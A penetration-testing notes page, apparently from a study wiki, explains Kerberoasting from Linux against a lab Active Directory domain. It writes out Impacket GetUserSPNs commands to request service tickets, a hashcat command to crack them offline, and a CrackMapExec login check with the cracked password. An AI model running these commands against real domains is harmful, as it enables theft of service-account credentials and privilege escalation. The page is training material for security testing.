---
description: It's like roasting marshmallows on a fire... except we're using SPN's instead
---

# Kerberoasting - From Linux

## Introduction

Kerberoasting is a <mark style="color:yellow;">lateral movement/privilege escalation technique</mark> in Active Directory environments.

* It should be highly noted that <mark style="color:yellow;">this attack targets Service Princial Names (SPNs) Accounts</mark>

### What do you need to perform this?

* An <mark style="color:yellow;">account's cleartext password or NTLM hash</mark>
* A shell from a domain user
* <mark style="color:yellow;">SYSTEM</mark> level access on a domain-joined account

### Service Accounts

* Domain accounts running services are often local admins
* If not, they are typically highly privileged domain accounts
* Always be sure to identify what privileges are granted across multiple servers and hosts on the domain
* Finding SPNs associated with high privileged accounts in Windows is very common
* Retrieving a Kerberos ticket for an account with a SPN does not by itself allow you to execute commands in the context of that account
* With that said, the TGS-REP or ticket, is encrypted with the NTLM hash&#x20;
  * This means that it can possibly be taken offline and cracked with Hashcat&#x20;

\-----------------------------------------------------------------------------------------------------

## Performing Kerberoasting

This attack can be performed with the following tools:

* Impacket's <mark style="color:yellow;">GetUserSPNs</mark> from a non-domain joined Linux host
* A combination of <mark style="color:yellow;">setspn.exe</mark>, <mark style="color:yellow;">powershell</mark>, and <mark style="color:yellow;">Mimikatz</mark>
* From Windows, we can use <mark style="color:yellow;">PowerView</mark>, <mark style="color:yellow;">Rubeus</mark>, and other PowerShell scripts

### Reality

<mark style="color:yellow;">Obtaining a TGS ticket from a Kerberoast attack will NOT guarantee you a set of valid credentials and the ticket must still be taken offline and cracked with Hashcat to obtain the cleartext password. TGS tickets take longer to crack than NTLM hashes!</mark>

Also, Kerberoasting can be a great way to move laterally or vertically in a domain but it does not guarantee us any level of access.

* There are times where you can perform the attack, retrieve the TGS keys, crack them offline, and we obtain Domain Admin access or obtain credentials that will aid us in our path there!

\-----------------------------------------------------------------------------------------------------

## Kerberoasting with GetUserSPNs

Before we start, we need to make sure that we have the following:

* Valid domain credentials (cleartext or NTLM hash)
* A shell in the context of a domain user, or account such as SYSTEM
* Successfully identify WHICH host is the Domain Controller so we can query it

{% embed url="https://github.com/SecureAuthCorp/impacket" %}
GitHub Repository
{% endembed %}

<mark style="color:yellow;">The best way to start this process is to start gathering a list of SPNs in the domain. To do this, we need a valid set of Domain credentials and the IP of the Domain Controller</mark>

### Listing SPN Accounts with GetUserSPNs

```
GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

<figure><img src="../../.gitbook/assets/image (1) (2) (3).png" alt=""><figcaption></figcaption></figure>

### Requesting all TGS Tickets

```
GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Saving the TGS Ticket to an Output File

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

* In this example, we will write the <mark style="color:yellow;">TGS ticket for the sqldev user in a file named sqldev\_tgs</mark>
* We can now crack the ticket offline using Hashcat!
* The Hashcat format is 13100

## Cracking the Ticket Offline with Hashcat

```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

* We get the password of <mark style="color:yellow;">database!</mark>

## Testing Authentication to a Domain Controller

* Upon successful cracking of the TGS ticket, we can use CrackMapExec (CME) to test our new creds and validate our authentication

```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
